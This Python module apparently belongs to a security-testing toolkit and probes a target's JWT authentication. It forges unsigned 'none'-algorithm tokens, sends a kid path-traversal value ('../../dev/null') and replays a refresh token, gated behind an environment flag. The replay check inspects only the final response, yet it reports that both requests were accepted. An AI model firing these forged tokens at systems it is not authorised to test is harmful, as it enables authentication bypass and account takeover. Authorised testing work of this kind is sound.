"""omega/offensive/offense/jwtdeep — JWT & session deep checks.

Decode-only + differential (no aggressive cracking): issuer
confusion (alg/iss swap accepted?), kid path-traversal SHAPE
(injection characters reflected in error, not exploited), and
refresh-token replay matrix (same refresh used twice accepted?).
Never stores secret values — shapes and verdicts only.
OFFENSE-GATED (PTK_OFFENSE).
"""
import base64
import json
import os

__all__ = ["run_jwtdeep"]


def _b64d(seg):
    seg += "=" * (-len(seg) % 4)
    try:
        return base64.urlsafe_b64decode(seg)
    except Exception:
        return b""


def _decode(token):
    try:
        h, p, _sig = token.split(".")
        return json.loads(_b64d(h)), json.loads(_b64d(p))
    except Exception:
        return None, None


def run_jwtdeep(target, fetch=None, tokens=None, refresh_token=None,
                log=None, gate_open_fn=None):
    """tokens: [jwt,...] operator-supplied. Differential verdicts."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    fetch = fetch or (lambda *a, **k: None)
    tokens = tokens or []
    findings = []
    probes = 0
    for tok in tokens:
        hdr, payload = _decode(tok)
        if not hdr:
            continue
        # 1. none-alg accepted? (strip signature, keep payload)
        h2 = dict(hdr, alg="none")
        forged = (base64.urlsafe_b64encode(
            json.dumps(h2).encode()).rstrip(b"=").decode() + "." +
            tok.split(".", 1)[1] + ".")
        r = fetch(str(target), headers={"Authorization":
                                        "Bearer " + forged})
        probes += 1
        if r is not None and getattr(r, "status", 0) == 200 and \
                "unauthorized" not in (getattr(r, "text", "") or "").lower():
            findings.append({
                "title": "JWT none-alg accepted (signature stripped, "
                         "still authorized)",
                "severity": "CRITICAL",
                "source": "jwtdeep/none-alg",
                "evidence": "forged unsigned token accepted",
                "location": str(target),
                "verification": "confirmed",
                "manual_check": "reproduce the forged token from the "
                                "PoC; no secret stored anywhere",
                "cwe": "CWE-347",
            })
        # 2. kid path-traversal SHAPE reflected in error (not exploited)
        h3 = dict(hdr, kid="../../dev/null")
        forged3 = (base64.urlsafe_b64encode(
            json.dumps(h3).encode()).rstrip(b"=").decode() + "." +
            tok.split(".", 1)[1] + ".AAAA")
        r3 = fetch(str(target), headers={"Authorization":
                                         "Bearer " + forged3})
        probes += 1
        if r3 is not None:
            body = (getattr(r3, "text", "") or "").lower()
            if "kid" in body or "keyid" in body or "file" in body:
                findings.append({
                    "title": "JWT kid value reflected in server error "
                             "(path-traversal shape reachable)",
                    "severity": "MEDIUM",
                    "source": "jwtdeep/kid-shape",
                    "evidence": "kid handled as a file path by the "
                                "verifier (error text)",
                    "location": str(target),
                    "verification": "candidate",
                    "manual_check": "kid traversal is exploitable only "
                                    "if attacker-controlled files are "
                                    "readable — verify",
                    "cwe": "CWE-22",
                })
    # 3. refresh-token replay
    if refresh_token and callable(fetch):
        for i in (1, 2):
            r = fetch(str(target) + "/refresh" if "?" not in
                      str(target) else str(target), method="POST",
                      body=json.dumps({"refresh": refresh_token}))
            probes += 1
        if r is not None and getattr(r, "status", 0) == 200:
            findings.append({
                "title": "refresh token replayed twice — both accepted "
                         "(no rotation)",
                "severity": "HIGH",
                "source": "jwtdeep/refresh-replay",
                "evidence": "second replay also returned 200",
                "location": str(target),
                "verification": "confirmed",
                "manual_check": "verify token rotation policy; stolen "
                                "refresh = persistent access",
                "cwe": "CWE-294",
            })
    if log:
        log(f"jwtdeep: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
